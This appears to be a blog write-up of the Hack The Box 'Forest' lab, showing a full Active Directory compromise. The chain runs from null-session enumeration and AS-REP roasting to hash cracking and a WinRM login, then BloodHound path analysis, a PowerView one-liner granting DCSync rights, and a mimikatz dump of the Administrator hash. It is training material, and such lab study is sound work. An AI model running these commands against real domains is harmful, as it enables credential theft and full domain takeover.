---
title: HTB-Forest
draft: false
tags:
  - htb
  - windows
  - easy
  - active-directory
  - genericall
  - as-rep-roasting
  - bloodhound
  - sharphound
  - writedacl
  - mimikatz
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/Forest.png)

## Information Gathering
### Rustscan

Rustscan finds many ports open:

`rustscan --addresses 10.10.10.161 --range 1-65535`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image.png)

Based on the ports open, this machine seems to be an active directory machine.

## Enumeration
### RPC - TCP 135

Let's start with enumerating RPC:

`rpccclient -U "" -N 10.10.10.161`

Luckily, we are able to execute commands as the null user.

Executing `enumdomusers`, we get list of users on the system:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-1.png)

We will make a list of users on the system for later attacks:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-2.png)


### LDAP - TCP 389

Next, let's enumerate LDAP. 

We will first query for base namingcontexts:

`ldapsearch -H ldap://10.10.10.161 -x -s base namingcontexts`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-3.png)

**DC=htb,DC=local** seems to be the base.

Luckily, we can bind to LDAP with no credentials. 

Let's forward result for bind on `DC=htb,DC=local` to another file (ldap-null-bing.txt):

`ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" > ldap-null-bing.txt`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-4.png)

Since the result contains thousand of lines, we used the command below to organize it:

`cat ldap-null-bing.txt | awk '{print $1}' | sort | uniq -c | sort -nr > xb-bind-sorted.txt`

Unfortunately, nothing interesting was found from the bind.
## AS-REP Roasting

Since we have the list of valid users on the system, let's try **AS-REP Roasting**:

`GetNPUsers.py 'htb.local/' -user users.txt -format hashcat -outputfile hashes -dc-ip 10.10.10.161`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-5.png)

We found user **svc-alfresco** being vulnerable AS-REP Roasting:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-6.png)

We will pass the hash to hashcat and crack it with rockyou.txt:

`haschat hash rockyou.txt`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/forest-hash.png)

Hash is cracked in no time and the password is revealed to be **s3rvice**. 

Let's see if the user **svc-alfresco** is in **Remote Management Group** with crackmapexec:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-8.png)

We can now winrm login as the user **svc-alfresco**:

`evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-7.png)


## Privesc: svc-alfresco to Administrator
### Bloodhound

Since this is an Active Directory machine, let's enumerate it with SharpHound and Bloodhound.

We will first upload SharpHound.exe:

`upload SharpHound.exe`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-9.png)

Let's run it and collect Active Directory information:

`./SharpHound.exe`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-10.png)

After zip file is created, we will download it:

`download 20240608002914_BloodHound.zip`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-11.png)

Now that we have collected Active Directory information, let's start up bloodhound with the command below:

```bash
sudo neo4j console
sudo bloodhound
```

After importing the zip file to bloodhound, we can query various analysis.

Checking on shortest path to Domain Admins, we see a valid path form user **svc-alfresco**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-12.png)

**Svc-alfresco** is a member of **Privileged IT Accounts** and **Privilege IT Account** is a member of **Account Operators**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-13.png)

**Account Operators** have **Generic All** write to **Exchange Windows Permissions** group and **Exchange Windows Permissions** group has **WriteDacl** write to **HTB.LOCAL**, which contains Domain Admins.

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-14.png)

### GenericALL

We will first perform **GenericAll** attack from **Svc-alfresco** to **Exchange Windows Permissions** group:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-15.png)

Let's add user **svc-alfresco** to **Exchange Windows Permissions** group:

`net group "Exchange Windows Permissions" svc-alfresco /add /domain`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-16.png)

We can confirm the command executed successfully:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-17.png)

### WriteDacl

Now that we are in the **Exchange Windows Permissions** group, let's move on to **WriteDacl** attack:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-18.png)

We will first upload **PowerView.ps1**:

`upload PowerView.ps1`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-19.png)

After uploading, let's run it:

`. ./PowerView.ps1`

We tried running the commands that will grant user svc-alfresco DCSync right but it seemed that svc-alfresco gets automatically removed from **Exchange Windows Permissions** group every few minutes. 

Let's craft a one-liner command that will add user **svc-alfresco** to **Exchange Windows Permissions** group and grant it permission to DCSync:

```powershell
net group "Exchange Windows Permissions" svc-alfresco /add /domain; $Cred = New-Object System.Management.Automation.PSCredential('htb.local\svc-alfresco', (ConvertTo-SecureString 's3rvice' -AsPlainText -Force)); Add-ObjectACL -PrincipalIdentity svc-alfresco -Credential $Cred -Rights DCSync
```

After running the command above, we have successfully execute **WriteDacl** attack and we can use mimikatz to obtain hash for Administrator:

`./mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:htb.local /user:Administrator" "exit"`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-20.png)

Now we have a shell as the administrator:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-21.png)